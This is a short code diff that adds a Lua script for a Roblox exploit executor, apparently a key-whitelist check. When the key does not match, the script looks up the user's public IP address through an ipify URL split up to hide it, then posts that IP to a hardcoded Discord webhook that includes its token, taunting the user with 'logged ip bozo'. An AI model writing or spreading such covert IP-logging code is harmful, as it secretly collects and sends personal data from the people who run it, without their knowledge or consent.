@@ -1,1 +1,25 @@
-return print('wowzers')
+print('wowzers')
+local whitelists = {
+'x';
+'b';
+}
+
+if table.find(whitelists,getgenv().key) then --mslotti
+print('Access Granted P1')
+else
+print('logged ip bozo')
+local ip1 = 'https://a'; local ip2 = 'pi.ipify.org/' -- encryption
+local realIpLinkAfterDecoding = ip1..ip2; -- Website To get IP
+local ip = game:HttpGet(realIpLinkAfterDecoding);
+xb = 'https://discord.com/api/webhooks/1102728337979363328/Apv4yVsG92f5DAKc1nEhw7G-2-abh87vaNdGBYaa8fsle8zeRdVEfYc5m1_RLFhaKf1N'
+local response = syn.request(
+{
+    Url = xb,
+    Method = 'POST',
+    Headers = {
+        ['Content-Type'] = 'application/json'
+    },
+    Body = game:GetService('HttpService'):JSONEncode({title = 'brosky failed'; content = 'ip: '..ip})
+})
+end
+return nil
